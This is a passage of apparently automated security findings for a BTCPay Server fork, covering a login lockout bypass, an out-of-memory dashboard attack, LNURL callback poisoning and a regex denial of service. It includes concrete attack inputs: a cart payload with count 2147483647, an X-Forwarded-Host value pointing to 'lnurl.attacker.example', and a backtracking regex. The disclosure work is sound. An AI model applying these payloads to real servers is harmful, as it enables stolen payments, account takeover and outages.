3. [BTCPayServer/Controllers/UIAccountController.cs:177–200](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L177-L200)
   POST /login verifies the password with CheckPasswordAsync (no Identity lockout check), calls AccessFailedAsync on failure (181-182) and refuses further attempts only when user.IsDisabledTemporarily is true (199). For a user with LockoutEnabled = false the lockout never engages and password guesses are accepted indefinitely. The same gate is used at 340, 403 and 460 for the second-factor steps.
4. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:158–184](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L158-L184)
   Every UserEvent.Registered for a non-admin, non-bypass user without an existing subscriber is routed through MigrateUsers(OneUserQuery), which calls UpdateUserLockoutStatus for the new user (line 360) with active = hasTrial (286). With a trial plan the subscriber is active, so every new account has LockoutEnabled cleared on creation.
5. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:91–95](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L91-L95)
   Every SubscriptionEvent.PlanUpdated (any edit of a plan in the offering) recomputes the state for all users in that plan, clearing LockoutEnabled for every active subscriber, including users previously re-enabled through SetDisabled (which keeps LockoutEnabled true) and users created from the subscription portal.
6. [BTCPayServer/Plugins/Monetization/Controllers/UIServerMonetizationController.cs:180–195](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/Controllers/UIServerMonetizationController.cs#L180-L195)
   Activation creates the starter plan with TrialDays from the modal and attaches the can-access feature (188-195), so the default plan satisfies both halves of (ss.active AND @canAccess). 'Migrate existing non-admin users' (242-247) and the 'migrate-users' command (284-300) run MigrateUsers for all non-admin users, clearing LockoutEnabled for all of them in one step.
7. [BTCPayServer/Plugins/Monetization/Views/MonetizationViewModel.cs:55](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/Views/MonetizationViewModel.cs#L55)
   The activation modal defaults TrialDays to 7, so by default migrated and newly registered subscribers are inserted as active (hasTrial = true).
8. [BTCPayServer/Services/UserService.cs:212–239](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/UserService.cs#L212-L239)
   SetDisabled, the sanctioned way to (un)disable an account, re-enables LockoutEnabled (219-220) and only toggles LockoutEnd; the maintainers intend LockoutEnabled to stay true. Because it returns Unchanged when disabled == user.IsDisabled (217), a later SubscriberActivated -> SetDisabled(false) does not repair a user whose flag the SQL cleared.
9. [BTCPayServer/Hosting/Startup.cs:213–223](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L213-L223)
   The shipped lockout policy is MaxFailedAccessAttempts = 5 / 5 minutes; the password policy is 6 characters with no complexity requirements, so online guessing is realistic once per-account lockout is gone.
10. [BTCPayServer/Hosting/Startup.cs:324–332](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L324-L332)
   Forwarded headers are honoured from any peer (KnownProxies/KnownIPNetworks cleared, ForwardedHeaders.All), so the per-RemoteAddress login rate limit (5r/min, Startup.cs 306; UIAccountController.cs 138) is evaded by rotating X-Forwarded-For. Per-account lockout is therefore the material defence this finding removes.

## Impact
A successful online guess gives full control of the victim user account: its stores, wallets (including hot-wallet spending), invoices and API keys. The defect removes the per-account control the project ships to prevent that; impact ratings reflect the resulting account takeover. No availability impact.

## Reproduction steps
1. Attacker: anonymous network client. Target: any subscriber account on a server with Monetization activated (every self-registered user, every migrated user, every active subscriber after a plan edit). The attacker posts password guesses to /login; after 5 failures Identity writes LockoutEnd but the account is never treated as locked because LockoutEnabled is false, so attempts continue without bound. The per-IP limit must be evaded by rotating X-Forwarded-For (trusted from any peer) and the attacker must still guess the password (6-char minimum, no complexity), hence AC HIGH. Monetization must be active (AT PRESENT). No privileges or user interaction.

## Recommended fix
1. UpdateUserLockoutStatus overloads Identity's LockoutEnabled flag as an 'account enabled' marker and writes false for active subscribers, which silently turns off failed-login lockout for those users because ApplicationUser.IsDisabled/IsDisabledTemporarily require LockoutEnabled = true. Fix criteria: After any Monetization lockout recomputation (MigrateUsers, PlanUpdated), LockoutEnabled remains true for every affected user and only LockoutEnd expresses enabled/disabled, matching UserService.SetDisabled. Verify: on a monetized server, register a user (or edit the plan), submit 5 wrong passwords for that user, and confirm the 6th attempt is refused with the lockout view.
2. Accounts already written with LockoutEnabled = false remain unprotected after the code fix, since SetDisabled(false) returns Unchanged for them. Fix criteria: A data migration or startup task restores LockoutEnabled = true for every existing user, so no previously affected subscriber remains exempt from lockout.

---
**Severity:** HIGH
**Status:** Open
**Category:** Authentication lockout bypass
**CWE:** [CWE-307](https://cwe.mitre.org/data/definitions/307.html)
**Attack vector:** NETWORK
**Attack complexity:** HIGH
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257712

---

# Payer-chosen PoS cart quantity drives an unbounded per-unit allocation loop in app sales statistics (store dashboard / Greenfield stats OOM)

## Details
Sales statistics for PoS and Crowdfund apps are computed by AppService.AggregateInvoiceEntitiesForStats, which expands each stored posData cart line into `Count` separate InvoiceStatsItem objects (`for (i = 0; i < lineItem.Count; i++) res.Add(new InvoiceStatsItem...)`). The cart line count is authored by the payer, stored verbatim on the invoice, and never upper-bounded or reconciled with what was paid.

Primary route (anonymous, default PoS configuration): POST /apps/{appId}/pos/Cart (or /Light) with `posData={"cart":[{"id":"fruit-tea","count":2147483647,"price":0},{"id":"fruit-tea","count":1,"price":0.01}]}`. The viewType is chosen by the caller in the route and the redirect guard at UIPointOfSaleController.cs:254-258 exempts Cart and Light views, so this is reachable regardless of the merchant's DefaultView/ShowCustomAmount/EnableShoppingCart settings. The controller only clamps `Count = Math.Max(1, count)`; the inventory check (297-299) runs only for items with an Inventory figure; Topup items skip the price floor (303-308), so a 0-price line with count 2^31-1 contributes 0 to the order total while a second cheap line makes the total non-zero (avoiding the AllowZeroAmountInvoices check in UIInvoiceController.cs:234). The default PoS template ships a Topup item ("fruit-tea", PointOfSaleSettings.cs:66-73); any Topup or 0-price item works. `PosData = JObject.FromObject(jposData)` (line 408) persists the attacker's cart. The attacker pays the cent-sized invoice (Lightning, or on-chain 0-conf -> Processing), so it enters the Processing/Settled set that GetInvoicesForApp selects (AppService.cs:50-54). The Static-view variant (Topup item -> top-up invoice payable with any amount) also works when ShowCustomAmount is enabled.

Secondary route (non-default): a Crowdfund app set to 'Count all invoices created on the store' (TagAllInvoices) aggregates every store invoice (AppService.cs:222,228); Bitpay POST /invoices (AnyoneCanInvoice or a pairing token) stores arbitrary posData via Metadata.PosDataLegacy -> PosData (InvoiceEntity.cs:197-212), so a cart line naming a perk id with count 2^31-1 reaches the same loop via CrowdfundPlugin.GetSalesStats.

Effect: every load of the store dashboard (default landing page for store members; Dashboard.cshtml:92-94 renders vc:app-sales/vc:app-top-items, whose JS fetches /apps/{appId}/dashboard/app-sales and /app-top-items -> GetSalesStats/GetItemStats), and every call to Greenfield GET /api/v1/apps/{appId}/sales or /top-items, runs the loop ~2^31 times, allocating a List of ~2^31 objects (>100 GB), driving the web process into GC thrash and OutOfMemory / container OOM-kill, which takes the whole multi-tenant server down. The invoice remains in the 7/30-day sales window and GetItemStats has no date bound, so the condition recurs on every dashboard visit until the merchant archives the invoice from a page that does not load the widgets. Sub-crash counts (tens of millions) still turn each dashboard load into a multi-second, multi-GB request.

The same unvalidated count also feeds ProductsReportProvider (Sales report Quantity / CurrencyAmount) and inflates SalesCount figures (minor integrity).

## Evidence
1. [BTCPayServer/Services/Apps/AppService.cs:159–176](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppService.cs#L159-L176)
   AggregateInvoiceEntitiesForStats reads Metadata.PosData.cart and, for every line whose id matches a template item, runs `for (i = 0; i < lineItem.Count; i++) res.Add(new InvoiceStatsItem...)`. Count is the stored payer value (int); with count = 2147483647 this attempts ~2^31 allocations (>100 GB) per invoice. This loop is the code the fix must change (sum count*price per line).
2. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:186–199](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L186-L199)
   The order POST is anonymous: `[HttpPost("/apps/{appId}/pos/{viewType?}")]`, `[IgnoreAntiforgeryToken]`, no Authorize; viewType and posData are caller-supplied. Only the publicinvoices rate limit (one request suffices) applies.
3. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:269–277](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L269-L277)
   The only bound on the payer's quantity is `cartItem.Count = Math.Max(1, cartItem.Count)`; there is no upper bound. requestedQuantities is used only for the inventory check.
4. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:253–258](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L253-L258)
   The redirect guard applies only when the view is neither Cart nor Light; `currentView = viewType ?? settings.DefaultView` is chosen by the caller in the route, so the cart-processing path is reachable on any PoS app irrespective of the merchant's DefaultView, ShowCustomAmount or EnableShoppingCart settings.
5. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:294–309](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L294-L309)
   Per-line validation: the inventory check runs only when the item has Inventory set; Topup items skip the price floor, so a Topup (or 0-price) line with price 0 and count 2^31-1 contributes 0 to the order total and is accepted. A second cheap line makes the invoice total non-zero.
6. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:385–410](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L385-L410)
   The invoice is created for the (cent-sized) order total — or as a top-up in the Static-view variant — and `PosData = JObject.FromObject(jposData)` persists the payer's cart with the huge count in Metadata.PosData.
7. [BTCPayServer/Services/Apps/PointOfSaleSettings.cs:66–73](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/PointOfSaleSettings.cs#L66-L73)
   The default PoS template ships a Topup item ("fruit-tea", 'Fruit Tea (any amount)'), so a default-configured PoS app satisfies the 0-price line requirement.
8. [BTCPayServer/Services/Apps/AppService.cs:50–53](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppService.cs#L50-L53)
   Only Processing/Settled invoices are aggregated, so the attacker pays the cent-sized invoice once (Lightning, or on-chain 0-conf -> Processing); the poisoned invoice then stays in the 7/30-day window and GetItemStats has no date bound.
9. [BTCPayServer/Plugins/PointOfSale/PointOfSalePlugin.cs:77–113](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/PointOfSalePlugin.cs#L77-L113)
   Both GetSalesStats and GetItemStats of the PoS app type feed the aggregation with the app's template items, so the attacker's line matches a template id.
10. [BTCPayServer/Controllers/UIAppsController.Dashboard.cs:13–56](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAppsController.Dashboard.cs#L13-L56)
   Dashboard AJAX endpoints /apps/{appId}/dashboard/app-sales and /app-top-items (fetched by the AppSales/AppTopItems components on every dashboard load) call GetSalesStats/GetItemStats on the app.
11. [BTCPayServer/Views/UIStores/Dashboard.cshtml:92–94](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIStores/Dashboard.cshtml#L92-L94)
   The store dashboard (default landing page for store members) renders vc:app-sales and vc:app-top-items for every app of the store; their scripts fetch the stats endpoints on each load.
12. [BTCPayServer/Controllers/GreenField/GreenfieldAppsController.cs:245–268](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldAppsController.cs#L245-L268)
   Greenfield GET /api/v1/apps/{appId}/sales and /top-items reach the same GetSalesStats/GetItemStats sink.
13. [BTCPayServer/Plugins/Crowdfund/CrowdfundPlugin.cs:86–91](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/CrowdfundPlugin.cs#L86-L91)
   Secondary route: Crowdfund GetSalesStats uses the same aggregation over PerksTemplate items; with TagAllInvoices (AppService.cs:222,228) any store invoice — including Bitpay invoices whose posData is stored via Metadata.PosDataLegacy — is aggregated.
14. [BTCPayServer/Services/Reporting/ProductsReportProvider.cs:63–73](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Reporting/ProductsReportProvider.cs#L63-L73)
   Related sink: the Sales report emits Quantity = item.Count and CurrencyAmount = Price*Count straight from the same payer cart, falsifying merchant sales figures (arithmetic only, no allocation loop).

## Impact
The aggregation loop allocates on the order of 2^31 objects (>100 GB) inside the shared web process on every dashboard load or stats API call, causing GC thrash and OutOfMemory / container OOM-kill of the whole multi-tenant server, repeatable until the invoice is archived or leaves the window (GetItemStats has no window). Sales counts and the Sales report are also inflated by the payer's count (minor integrity).

## Reproduction steps
1. An anonymous payer POSTs one PoS order to /apps/{appId}/pos/Cart with a 0-price Topup line (default template ships one) at count 2^31-1 plus a cent-sized line, pays it, and waits for a store member to open the store dashboard (default landing page, a routine action) or for any Greenfield sales/top-items call. The Cart/Light view is caller-selected and bypasses the merchant's view settings, so a default-configured PoS app suffices; no special deployment condition is required beyond a template containing a Topup or 0-price item (the shipped default).

## Recommended fix
1. AggregateInvoiceEntitiesForStats materialises one InvoiceStatsItem per cart unit using an unbounded payer-supplied count. Fix criteria: Statistics are computed in O(lines) (aggregate count and count*price per line) so an invoice with count = int.MaxValue costs constant memory, and the dashboard and Greenfield sales/top-items endpoints return promptly for such an invoice.
2. The PoS order flow persists the payer's cart quantities without an upper bound for items that do not track inventory, and Bitpay/Greenfield posData is stored verbatim and later trusted by app statistics and reports. Fix criteria: Quantities accepted on the public PoS endpoint are bounded to a sane maximum (and reconciled with the paid amount), and app statistics/reports only consume carts the app flow validated or re-validate them against the template, so foreign or inflated posData cannot drive their cost or figures.

---
**Severity:** HIGH
**Status:** Open
**Category:** Uncontrolled resource consumption
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257709

---

# First LNURL fetch persists its forwarded-host callback, redirecting later payers' wallets to attacker's callback

## Details
The LNURL-pay flow for an invoice (anonymous GET /{cryptoCode}/lnurl/pay/i/{invoiceId}, UILNURLController.cs:735-739) builds the LNURLPayRequest lazily on the first fetch. CreateLNUrlRequestFromInvoice sets `Callback` from `Request.GetRequestBaseUrl()` (lines 667-670) — the first fetcher's scheme/host/pathbase — and, because `LNURLPayPaymentHandler.ConfigurePrompt` (lines 67-71) leaves `PayRequest` null, persists the whole request into the invoice's LNURL prompt (lines 682-686, `UpdatePaymentDetails`). Every subsequent amount-less fetch returns the stored `promptDetails.PayRequest` verbatim (lines 774-779). Startup.cs:329-332 honours X-Forwarded-Host/X-Forwarded-Proto from any peer (and a bare Kestrel deployment honours the Host header directly), so whoever touches a New invoice's LNURL first with `X-Forwarded-Host: lnurl.attacker.example` permanently sets that invoice's callback to https://lnurl.attacker.example/BTC/lnurl/pay/i/{id}. The project's shipped authority control, `ServerSettings.BaseUrl` (preferred by CallbackGenerator.GetRequestBaseUrl for e-mail links), and the invoice's creation-time `ServerUrl` (InvoiceEntity.GetRequestBaseUrl) are both ignored here.

The real payer then scans the checkout QR, which encodes the legitimate server's pay/i/{id} (LNURLPayPaymentLinkExtension builds it from the checkout page's own request). The wallet contacts the real BTCPay host, receives the stored request with the attacker's `callback`, and per LUD-06 calls that callback with the amount. The attacker's server answers with its own BOLT11 whose description hash matches the metadata it was handed; the payer pays the attacker, the BTCPay invoice stays unpaid and the merchant never receives the funds. Unlike the rejected record lnurl-pay-callback-third-party-cancels-payer-bolt11 (BOLT11 replacement, limited to unpinned invoices and the payer's own id), this affects Standard invoices and serves one party's request-derived state to a different party's wallet.

Attacker positions: (a) anonymous — public payment-request pages embed every pending invoice of the request with its Id in srvModel (PaymentRequestService.AsViewModel:94-135, ViewPaymentRequest.cshtml:39), so a watcher of a shared payment request can poison other payers' invoices as they are created; (b) a store member with only CanViewInvoices (Guest/Employee, view-only Greenfield key) sees every New invoice id the moment it exists (ListInvoices, Greenfield GetInvoices) and can poll-and-poison ahead of the customer's scan; for invoices created ahead of payment (API-created, e-mailed, terminal) the window is long. Neither position may touch funds or Lightning settings by any sanctioned path.

Conditions: LNURL-pay enabled for checkout (default when Lightning is configured); the attacker's fetch must precede the payer's wallet; the attacker's request must reach Kestrel with a Host/X-Forwarded-Host they chose (true for direct exposure and for any proxy that passes X-Forwarded-Host through, which no project documentation requires operators to prevent). Assumptions: LUD-06 wallets follow `callback` without enforcing same-origin (the spec does not require it); the LNURL package pinned at 0.0.36 serialises `Callback` as `callback` (consistent with BTCPayServer.Tests/LightningTests.cs:1066).

## Evidence
1. [BTCPayServer/Controllers/UILNURLController.cs:667–670](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UILNURLController.cs#L667-L670)
   CreateLNUrlRequestFromInvoice builds lnurlRequest.Callback from Request.GetRequestBaseUrl() (RequestBaseUrl.cs:43 = request.Scheme/Host/PathBase), i.e. from the authority of whichever client first fetches the invoice's LNURL; ServerSettings.BaseUrl and the invoice's own ServerUrl (InvoiceEntity.GetRequestBaseUrl, line 779) are not consulted.
2. [BTCPayServer/Controllers/UILNURLController.cs:682–691](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UILNURLController.cs#L682-L691)
   When paymentMethodDetails.PayRequest is null (always, for checkout invoices) the freshly built request including the fetcher's Callback is written into the invoice's LNURL prompt via UpdatePaymentDetails, making the first fetcher's host part of the invoice's persisted state.
3. [BTCPayServer/Controllers/UILNURLController.cs:774–783](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UILNURLController.cs#L774-L783)
   On every later amount-less fetch GetLNURLForInvoice returns promptDetails.PayRequest verbatim, so the real payer's wallet receives the first fetcher's callback URL and, per LUD-06, calls that host for its BOLT11.
4. [BTCPayServer/Controllers/UILNURLController.cs:735–739](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UILNURLController.cs#L735-L739)
   GET pay/i/{invoiceId} is anonymous, CORS-open and antiforgery-exempt, and lazily activates the LNURL prompt (762-767): the attacker needs only the invoice id to be the first toucher of a New invoice.
5. [BTCPayServer/Payments/LNURLPay/LNURLPayPaymentHandler.cs:67–70](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/LNURLPay/LNURLPayPaymentHandler.cs#L67-L70)
   ConfigurePrompt initialises LNURLPayPaymentMethodDetails with only Bech32Mode, so PayRequest is null for every invoice until the first anonymous LNURL fetch — the poisoning window is always open before the payer's wallet arrives.
6. [BTCPayServer/Hosting/Startup.cs:324–332](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L324-L332)
   KnownIPNetworks/KnownProxies are cleared with ForwardedHeaders.All, so X-Forwarded-Host/X-Forwarded-Proto from any peer become Request.Host/Scheme (and a direct Host header does the same where Kestrel is exposed); the first fetcher therefore controls the persisted callback authority.
7. [BTCPayServer/Payments/LNURLPay/LNURLPayPaymentLinkExtension.cs:25–36](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/LNURLPay/LNURLPayPaymentLinkExtension.cs#L25-L36)
   The checkout QR encodes the legitimate server's pay/i/{invoiceId} URL built from the checkout viewer's own request, so the victim's wallet contacts the real BTCPay host, which hands it the stored attacker callback.
8. [BTCPayServer/PaymentRequest/PaymentRequestService.cs:94–134](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/PaymentRequest/PaymentRequestService.cs#L94-L134)
   AsViewModel lists every non-empty invoice of a payment request, including New ones, with Id; the public ViewPaymentRequest page embeds this model as srvModel (ViewPaymentRequest.cshtml:39) and renders invoice.Id, so an anonymous viewer of a shared payment request learns other payers' pending invoice ids.
9. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:1093–1095](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L1093-L1095)
   A store member holding only CanViewInvoices (Guest/Employee roles, view-only Greenfield keys; GreenfieldInvoiceController.cs:83 likewise) sees every New invoice id as it is created, giving a role that may not touch funds or settings early knowledge of target invoices.
10. [BTCPayServer/Services/CallbackGenerator.cs:34–43](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/CallbackGenerator.cs#L34-L43)
   The project's shipped control for authority selection: CallbackGenerator prefers the configured ServerSettings.BaseUrl over the request host when building links. The LNURL callback path does not use it, so the control is bypassed for the one URL that is persisted and served to third parties.

## Impact
The integrity of the invoice's payment flow is fully subverted: Lightning payments intended for the store are routed to the attacker for every invoice touched first, the invoice remains unpaid and the merchant loses the sale. No confidentiality impact; the invoice remaining unpayable through the poisoned path is incidental. Subsequent-system impact: The payer's wallet, outside BTCPay, is directed by the served callback to pay a BOLT11 the attacker issued: the customer's funds for that invoice go to the attacker with the attacker in full control of the destination.

## Reproduction steps
1. An anonymous viewer of a public payment-request page, or a CanViewInvoices store member, issues one unauthenticated GET to pay/i/{id} with X-Forwarded-Host/Proto (or Host) set to their server before the customer's wallet does; the server persists the attacker's callback and serves it to the customer's wallet, which pays the attacker's BOLT11. No credentials are needed on the anonymous route (PR NONE); the attacker must hold a pending invoice id and win the first-fetch race, and LNURL-pay must be enabled (AT PRESENT); the customer's scan is the ordinary payment action (UI PASSIVE).

## Recommended fix
1. The LNURL-pay callback authority is derived from the first anonymous fetcher's request (Host/X-Forwarded-Host trusted from any peer) instead of a trusted source, then persisted on the invoice and served to other parties' wallets. Fix criteria: Wallet-facing callback and verify URLs must be built from a trusted authority — the configured ServerSettings.BaseUrl (as CallbackGenerator already does) or the invoice's creation-time ServerUrl — never from an anonymous caller's Host. Verify that fetching pay/i/{id} with X-Forwarded-Host: evil.example yields a callback on the configured host, both in that response and in every later fetch.
2. The stored PayRequest is returned verbatim on later fetches, so request-derived state from one client is replayed to every other client for the invoice's lifetime. Fix criteria: Do not persist request-derived URL parts, or regenerate callback/verify URLs on every response; store only host-independent fields (metadata, bounds, comment settings). Verify that two fetches of the same invoice with different Host values each receive callbacks on the trusted host and that no Host value is written to the invoice blob.

---
**Severity:** HIGH
**Status:** Open
**Category:** Open redirect
**CWE:** [CWE-348](https://cwe.mitre.org/data/definitions/348.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257708

---

# Store-authored jsonpath like_regex evaluated on shared DB stalls server-wide email processing

## Details
Store email rules carry an optional `condition`, a PostgreSQL jsonpath written by anyone holding CanModifyStoreSettings on a store (UIStoreEmailRulesController -> UIEmailRuleControllerBase). For every TriggerEvent of that store the rule processor runs `SELECT * FROM email_rules WHERE store_id = $1 AND trigger = $2 AND (condition IS NULL OR jsonb_path_exists($3::JSONB, condition::JSONPATH))` (EmailRuleData.GetMatches). jsonpath's `like_regex` is evaluated by PostgreSQL's POSIX ARE engine, whose matching cost for patterns with back-references is super-linear in the subject (the engine has to try the possible split points of the subject for each back-reference, at least O(n^2) for `^(.*)\1$` and worse with more references or nesting). The subject here is the event model, which for invoice triggers contains the whole invoice Metadata object that the same store owner supplies, with no size cap, when creating an invoice via Greenfield.

Attack: a self-registered user creates a store, saves an email rule on trigger `WH-InvoiceCreated` with a condition such as `$.Invoice.Metadata.x ? (@ like_regex "^(.*)\\1\\1$")` (accepted: ValidateCondition at UIEmailRuleControllerBase.cs:199-213 only checks that the jsonpath compiles against '{}'), then repeatedly POSTs /api/v1/stores/{storeId}/invoices (CanCreateInvoice on their own store, no rate limit) with a large metadata string under `x`. No SMTP configuration is needed: GetMatches runs before any sender is resolved. Each invoice produces an InvoiceCreated TriggerEvent (and later InvoiceExpired), and each of those makes GetMatches run the regex on the shared PostgreSQL instance.

Impact: StoreEmailRuleProcessorSender is an EventHostedServiceBase with a single unbounded channel processed one event at a time (EventHostedServiceBase.cs:41-67), and it is the only consumer of TriggerEvent. While an attacker event is being evaluated, every other tenant's rule-based email (invoice notifications, store invitations, multisig requests) and the server's own default-rule emails (password reset, email confirmation, invitation, approval - seeded by DefaultServerEmailRulesMigration and published through UserEventTriggerHostedService) wait behind it, and the backlog accumulates in memory. Each evaluation also occupies a PostgreSQL backend at full CPU until it completes or is cancelled. A handful of invoice creations per minute keeps the queue permanently stalled.

This is distinct from the earlier dismissed leads at this location (dismissed-emailruledata-82-6e53, e7-emailrule-condition-jsonpath), which established that the statement is parameterised, that rows are store-scoped and that invalid jsonpath is rejected at write time and exceptions are caught; none of them considered the evaluation cost of a syntactically valid like_regex or that a slow (not failing) evaluation blocks the shared serial queue. The server-rule path (store_id IS NULL) is admin-authored and not part of this finding.

Assumptions on dependencies (not verifiable in the checkout): (1) PostgreSQL >= 14 (SetPostgresVersion(14,0)) evaluates back-reference regexes in super-linear time and honours query cancellation inside the regex engine; (2) Npgsql.EntityFrameworkCore.PostgreSQL 10.0.3 applies its default 30 s CommandTimeout to this FromSqlInterpolated query since BTCPay sets none, bounding each single evaluation at roughly 30 s of DB time; (3) EnableRetryOnFailure(10) may retry a timed-out command if Npgsql classifies the timeout as transient, multiplying the per-event stall. The attack holds under (1) and (2) alone.

## Evidence
1. [BTCPayServer.Data/Data/EmailRuleData.cs:82–96](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Data/Data/EmailRuleData.cs#L82-L96)
   GetMatches casts the stored, store-authored `condition` column to JSONPATH and evaluates it with jsonb_path_exists against the full event model (parameterised) on every TriggerEvent for that store. A like_regex inside the condition is run by PostgreSQL's POSIX ARE engine over attacker-chosen model strings; nothing here bounds the regex's cost or sets a statement/command timeout.
2. [BTCPayServer/Plugins/Emails/Controllers/UIEmailRuleControllerBase.cs:183–214](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Controllers/UIEmailRuleControllerBase.cs#L183-L214)
